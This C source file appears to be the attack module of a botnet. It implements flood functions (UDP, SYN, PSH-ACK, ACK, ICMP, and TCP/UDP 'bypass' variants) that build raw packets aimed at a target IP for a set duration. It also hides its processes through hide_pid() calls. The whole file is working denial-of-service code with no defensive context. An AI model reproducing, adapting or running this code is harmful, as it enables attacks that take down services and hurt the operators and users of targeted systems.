#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/prctl.h>
#include <arpa/inet.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/if_ether.h>

#include "dbg.h"
#include "bool.h"
#include "hide.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"

#define TCP_OPT_NOP 1
#define TCP_OPT_MSS 2
#define TCP_OPT_WS 3
#define TCP_OPT_SACK 4
#define TCP_OPT_TIMESTAMP 8
#define TCPOPT_EOL 0x00

static void setup_ipheaders(struct iphdr *iph, uint32_t ip, uint16_t len, uint8_t protocol) {

    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(len);
    iph->frag_off = htons(1 << 14);
    iph->ttl = 128;
    iph->protocol = protocol;
    iph->saddr = local_addr;
    iph->daddr = ip;
}

static void setup_syn_opts(uint8_t *opts) {
    *opts++ = TCP_OPT_MSS;
    *opts++ = 4;
    *((uint16_t *)opts) = htons(1460);
    opts += sizeof(uint16_t);

    *opts++ = TCP_OPT_NOP;

    *opts++ = TCP_OPT_WS;
    *opts++ = 3;
    *opts++ = 2;

    *opts++ = TCP_OPT_SACK;
    *opts++ = 2;

    *opts++ = TCP_OPT_TIMESTAMP;
    *opts++ = 10;
    *((uint32_t *)opts) = rand_next();
    opts += sizeof(uint32_t);
    *((uint32_t *)opts) = 0;
    opts += sizeof(uint32_t);
    *opts = TCPOPT_EOL;
}

static void setup_other_opts(uint8_t *opts) {

    *opts++ = TCP_OPT_NOP;
    *opts++ = TCP_OPT_NOP;

    *opts++ = TCP_OPT_TIMESTAMP;
    *opts++ = 10;
    *((uint32_t *)opts) = rand_next();
    opts += sizeof(uint32_t);
    *((uint32_t *)opts) = rand_next();
    opts += sizeof(uint32_t);
    *opts = TCPOPT_EOL;
}

static void watch_time(int seconds) {

    if (fork() != 0)
        return;

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    hide_pid();

    DEBUG_PRINT("[watch_time] started: (\'%d\') | seconds: (\'%d\')\n", getpid(), seconds);
    sleep(seconds);

    DEBUG_PRINT("[watch_time] kill() pid: (\'%d\'), exit()\n", getppid());
    unhide_pid();
    kill(getppid(), SIGKILL);
    exit(0);
}

int window_sizes[] = {1024, 4096, 8192, 16384, 32768, 65536, 131072, 262144};

void udp_plain_flood(char *ip, uint8_t seconds, uint16_t dport, uint16_t sport, uint16_t len, uint32_t rate, char *payload) {

    DEBUG_PRINT("[udp_plain_flood] started: (\'%d\')\n", getpid());

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (fd == -1) {
        DEBUG_PRINT("[udp_plain_flood] socket() failed\n");
        return;
    }

    struct sockaddr_in bind_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(sport ? sport : rand_next_range(1024, 65535)),
        .sin_addr.s_addr = INADDR_ANY
    };

    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(dport ? dport : rand_next_range(1024, 65535)),
        .sin_addr.s_addr = inet_addr(ip)
    };

    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    int len_ptr = len;
    char *payload_ptr = calloc(1400, sizeof(char));

    if (payload)
        memcpy(payload_ptr, payload, len_ptr);

    watch_time(seconds);

    while (TRUE) {

        if (!payload) {
            if (!len)
                len_ptr = rand_next_range(512, 1024);

            rand_str(payload_ptr, len_ptr);
        }

        send(fd, payload_ptr, len_ptr, MSG_NOSIGNAL);
	if (rate)
            usleep(rate);
    }
}

void udp_flood(char *ip, uint8_t seconds, uint16_t dport, uint16_t sport, uint16_t len, uint32_t rate, char *payload) {

    DEBUG_PRINT("[udp_flood] started: (\'%d\')\n", getpid());

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (fd == -1) {
        DEBUG_PRINT("[udp_flood] socket() failed\n");
        return;
    }

    struct sockaddr_in bind_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(sport ? sport : rand_next_range(1024, 65535)),
        .sin_addr.s_addr = INADDR_ANY
    };

    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(dport ? dport : rand_next_range(1024, 65535)),
        .sin_addr.s_addr = inet_addr(ip)
    };

    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    int len_ptr = len;
    char *payload_ptr = calloc(1400, sizeof(char));

    if (payload)
        memcpy(payload_ptr, payload, len_ptr);

    watch_time(seconds);

    while (TRUE) {

        if (!payload) {
            if (!len)
                len_ptr = rand_next_range(512, 1024);

            rand_str(payload_ptr, len_ptr);
        }

        send(fd, payload_ptr, len_ptr, MSG_NOSIGNAL);
	if (rate)
	    usleep(rate);
    }
}

void syn_flood(char *ip, uint8_t seconds, uint16_t dport, uint16_t sport, uint16_t len, uint32_t rate, char *payload) {

    (void)len;
    (void)payload;

    DEBUG_PRINT("[syn_flood] started: (\'%d\')\n", getpid());

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (fd == -1) {
        DEBUG_PRINT("[syn_flood] socket() failed\n");
        return;
    }

    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int){1}, sizeof(int)) == -1) {
        DEBUG_PRINT("[syn_flood] setsockopt() failed\n");
        return;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = 0,
        .sin_addr.s_addr = inet_addr(ip)
    };

    char *data = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);

    struct iphdr *iph = (struct iphdr *)data;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    uint8_t *opts = (uint8_t *)(tcph + 1);
    int options_size = 20, packet_size = (sizeof(struct iphdr) + sizeof(struct tcphdr) + options_size);

    setup_ipheaders(iph, addr.sin_addr.s_addr, packet_size, IPPROTO_TCP);

    tcph->syn = 1;
    tcph->doff = 10;

    setup_syn_opts(opts);

    watch_time(seconds);

    tcph->seq = 1;
    tcph->dest = addr.sin_port;
    while (TRUE) {
        iph->id = rand_next_range(1, 65535);

        addr.sin_port = htons(dport ? dport : rand_next_range(1024, 65535));
        tcph->source = htons(sport ? sport : rand_next_range(1024, 65535));
	tcph->window = htons(window_sizes[rand() % 8]);

        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        tcph->check = 0;
        tcph->check = checksum_tcp_udp(iph, tcph, htons(sizeof(struct tcphdr) + options_size), sizeof(struct tcphdr) + options_size);

        sendto(fd, data, packet_size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
	if (rate)
	    usleep(rate);
    }
}

void psh_ack_flood(char *ip, uint8_t seconds, uint16_t dport, uint16_t sport, uint16_t len, uint32_t rate, char *payload) {

    DEBUG_PRINT("[psh_ack_flood] started: (\'%d\')\n", getpid());

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (fd == -1) {
        DEBUG_PRINT("[psh_ack_flood] socket() failed\n");
        return;
    }

    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int){1}, sizeof(int)) == -1) {
        DEBUG_PRINT("[psh_ack_flood] setsockopt() failed\n");
        return;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = 0,
        .sin_addr.s_addr = inet_addr(ip)
    };

    char *data = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + 12 + 1400);

    struct iphdr *iph = (struct iphdr *)data;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    uint8_t *opts = (uint8_t *)(tcph + 1);
    char *payload_ptr = (char *)(opts + 1);
    int options_size = 12, len_ptr = len, packet_size = (sizeof(struct iphdr) + sizeof(struct tcphdr) + options_size);

    setup_ipheaders(iph, addr.sin_addr.s_addr, 0, IPPROTO_TCP);

    tcph->psh = 1;
    tcph->ack = 1;

    tcph->doff = (sizeof(struct tcphdr) + options_size) / 4;
    if((sizeof(struct tcphdr) + options_size) % 4 > 0)
       tcph->doff++;

    tcph->seq = 1; // htonl(rand_next_range(10000, 99999999));
    tcph->ack_seq = 1; // rand_next();

    setup_other_opts(opts);

    if (payload)
        memcpy(payload_ptr, payload, len_ptr);

    watch_time(seconds);

    while (TRUE) {
        if (!payload) {
            if (!len)
                len_ptr = rand_next_range(512, 1024);

            rand_str(payload_ptr, len_ptr);
        }

        iph->id = rand_next_range(1, 65535);
        iph->tot_len = htons(packet_size + len_ptr);

        addr.sin_port = htons(dport ? dport : rand_next_range(1024, 65535));
        tcph->source = htons(sport ? sport : rand_next_range(1024, 65535));
        tcph->dest = addr.sin_port;

        tcph->window = htons(window_sizes[rand() % 8]);

        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        tcph->check = 0;
        tcph->check = checksum_tcp_udp(iph, tcph, htons(sizeof(struct tcphdr) + options_size + len_ptr), sizeof(struct tcphdr) + options_size + len_ptr);

        sendto(fd, data, packet_size + len_ptr, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
	if (rate)
	    usleep(rate);
    }
}

void ack_flood(char *ip, uint8_t seconds, uint16_t dport, uint16_t sport, uint16_t len, uint32_t rate, char *payload) {

    DEBUG_PRINT("[ack_flood] started: (\'%d\')\n", getpid());

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (fd == -1) {
        DEBUG_PRINT("[ack_flood] socket() failed\n");
        return;
    }

    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int){1}, sizeof(int)) == -1) {
        DEBUG_PRINT("[ack_flood] setsockopt() failed\n");
        return;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = 0,
        .sin_addr.s_addr = inet_addr(ip)
    };

    char *data = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + 12 + 1400);

    struct iphdr *iph = (struct iphdr *)data;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    uint8_t *opts = (uint8_t *)(tcph + 1);
    char *payload_ptr = (char *)(opts + 1);
    int options_size = 12, len_ptr = len, packet_size = (sizeof(struct iphdr) + sizeof(struct tcphdr) + options_size);

    setup_ipheaders(iph, addr.sin_addr.s_addr, 0, IPPROTO_TCP);

    tcph->ack = 1;

    tcph->doff = (sizeof(struct tcphdr) + options_size) / 4;
    if((sizeof(struct tcphdr) + options_size) % 4 > 0)
       tcph->doff++;

    tcph->seq = 1;
    tcph->ack_seq = 1;

    setup_other_opts(opts);

    if (payload)
        memcpy(payload_ptr, payload, len_ptr);

    watch_time(seconds);

    while (TRUE) {
        if (!payload) {
            if (!len)
                len_ptr = rand_next_range(512, 1024);

            rand_str(payload_ptr, len_ptr);
        }

        iph->id = rand_next_range(1, 65535);
        iph->tot_len = htons(packet_size + len_ptr);

        addr.sin_port = htons(dport ? dport : rand_next_range(1024, 65535));
        tcph->source = htons(sport ? sport : rand_next_range(1024, 65535));
        tcph->dest = addr.sin_port;

        tcph->window = htons(window_sizes[rand() % 8]);

        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        tcph->check = 0;
        tcph->check = checksum_tcp_udp(iph, tcph, htons(sizeof(struct tcphdr) + options_size + len_ptr), sizeof(struct tcphdr) + options_size + len_ptr);

        sendto(fd, data, packet_size + len_ptr, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
	if (rate)
	    usleep(rate);
    }
}

void icmp_flood(char *ip, uint8_t seconds, uint16_t dport, uint16_t sport, uint16_t len, uint32_t rate, char *payload) {

    (void)sport;

    DEBUG_PRINT("[icmp_flood] started: (\'%d\')\n", getpid());

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

    if (fd == -1) {
        DEBUG_PRINT("[icmp_flood] socket() failed\n");
        return;
    }

    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int){1}, sizeof(int)) == -1) {
        DEBUG_PRINT("[icmp_flood] setsockopt() failed\n");
        return;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(dport),
        .sin_addr.s_addr = inet_addr(ip)
    };

    char *data = calloc(1, sizeof(struct iphdr) + sizeof(struct icmphdr) + 1400);

    struct iphdr *iph = (struct iphdr *)data;
    struct icmphdr *icmph = (struct icmphdr *)(iph + 1);
    char *payload_ptr = (char *)(icmph + 1);
    int len_ptr = len, seq = 1;

    setup_ipheaders(iph, addr.sin_addr.s_addr, 0, IPPROTO_ICMP);

    icmph->type = ICMP_ECHO;
    icmph->code = 0;

    if (payload)
        memcpy(payload_ptr, payload, len_ptr);

    watch_time(seconds);

    while (TRUE) {
        if (!payload) {
            if (!len)
                len_ptr = rand_next_range(512, 1024);

            rand_hex(payload_ptr, len_ptr);
        }

        iph->id = rand_next_range(1, 65535);
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + len_ptr);

        icmph->un.echo.sequence = htons(seq++);
        icmph->un.echo.id = htons(rand_next_range(1, 65535));

        icmph->checksum = 0;
        icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + len_ptr);

        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        sendto(fd, data, sizeof(struct iphdr) + sizeof(struct icmphdr) + len_ptr, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
	if (rate)
	    usleep(rate);
    }
}

void tcpbypass_flood(char *ip, uint8_t seconds, uint16_t dport, uint16_t sport, uint16_t len, uint32_t rate, char *payload) {

    (void)sport;

    DEBUG_PRINT("[tcpbypass_flood] started: (\'%d\')\n", getpid());

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(dport),
        .sin_addr.s_addr = inet_addr(ip),
    };

    int fd, state = 0, ret, err, len_ptr = len;

    fd_set write_set;
    struct timeval timeout;
    socklen_t err_len = sizeof(int);

    char *payload_ptr = calloc(1400, sizeof(char));

    if (payload)
        memcpy(payload_ptr, payload, len_ptr);

    watch_time(seconds);

    while (TRUE) {
        switch (state) {
            case 0:
                if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;
            
                fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));

                errno = 0;
                if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS) {
                    state = 3;
                    continue;
                }

                state = 1;
		if (rate)
		     usleep(rate);
                break;
            case 1:
                FD_ZERO(&write_set);
                FD_SET(fd, &write_set);

                timeout.tv_usec = 0;
                timeout.tv_sec = 1;

                if (select(fd + 1, NULL, &write_set, NULL, &timeout) == 1) {

                    ret = getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

                    if (!ret && !err) {
                        state = 2;
                        break;
                    }
                }

                state = 3;
		if (rate)
		    usleep(rate);
                break;
            case 2:
                if (!payload) {
                    if (!len)
                        len_ptr = rand_next_range(512, 1024);

                    rand_str(payload_ptr, len_ptr);
                }

                if ((send(fd, payload_ptr, len_ptr, MSG_NOSIGNAL) == -1 && errno != EAGAIN))
                    state = 3;

		if (rate)
		    usleep(rate);
                break;
            case 3:
                close(fd);
                state = 0;
		if (rate)
		    usleep(rate);
                break;
        }
    }
}

void udpbypass_flood(char *ip, uint8_t seconds, uint16_t dport, uint16_t sport, uint16_t len, uint32_t rate, char *payload) {

    DEBUG_PRINT("[udpbypass_flood] started: (\'%d\')\n", getpid());

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (fd == -1) {
        DEBUG_PRINT("[udpbypass_flood] socket() failed\n");
        return;
    }

    struct sockaddr_in bind_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(sport ? sport : rand_next_range(1024, 65535)),
        .sin_addr.s_addr = INADDR_ANY
    };
    
    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(dport ? dport : rand_next_range(1024, 65535)),
        .sin_addr.s_addr = inet_addr(ip)
    };

    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    int len_ptr = len;
    char *payload_ptr = calloc(1400 + 128, sizeof(char));

    if (payload)
        memcpy(payload_ptr, payload, len_ptr);

    watch_time(seconds);

    while (TRUE) {

        if (payload) {
            len_ptr = rand_next_range(1, 128);
            rand_hex(payload_ptr + len, len_ptr);
            send(fd, payload_ptr, len + len_ptr, MSG_NOSIGNAL);
        }
        else {
            len_ptr = len + rand_next_range(1, 128);
            rand_hex(payload_ptr, len_ptr);
            send(fd, payload_ptr, len_ptr, MSG_NOSIGNAL);
        }
	if (rate)
	    usleep(rate);
    }
}
